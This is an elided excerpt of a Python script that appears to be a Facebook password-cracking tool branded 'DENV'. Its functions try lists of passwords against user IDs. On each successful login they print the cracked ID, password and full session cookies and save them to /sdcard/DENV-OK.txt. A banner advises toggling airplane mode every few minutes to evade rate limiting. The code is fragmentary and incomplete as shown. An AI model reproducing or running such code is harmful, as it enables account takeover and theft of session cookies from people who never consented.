...
["ᴜsᴇ ᴀɪʀᴘʟᴀɴᴇ ᴍᴏᴅᴇ ᴇᴠᴇʀʏ 3 ᴍɪɴs ᴍᴡᴀ"']
...
def gml():
	...
	print('[?] Total Ok Id Save in  /sdcard/DENV-OK.txt')
	print('[?] Total Cp Id Save in  /sdcard/DENV-CP.txt')
	print(47*"-")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\r\r\033[1;32m[DENV-DONE] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🍪]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print('\r\r\x1b[1;36m [DENV-LOCK] ' +cid+ ' • ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r\r\033[1;37m [DENV-V1-RNDM] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def api(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [DENV-API-FILE] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				...
				print('\r\r\033[1;32m [DENV-DONE] '+str(ids)+' | '+pas+'\033[1;97m')
...
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [DENV-VIP-FILE] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [DENV-DONE] %s | %s'%(ids,pas))
                                print('\r\r\033[1;32m [COOKIES] %s   '%(cookie))
                                open(f'/sdcard/DENV-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
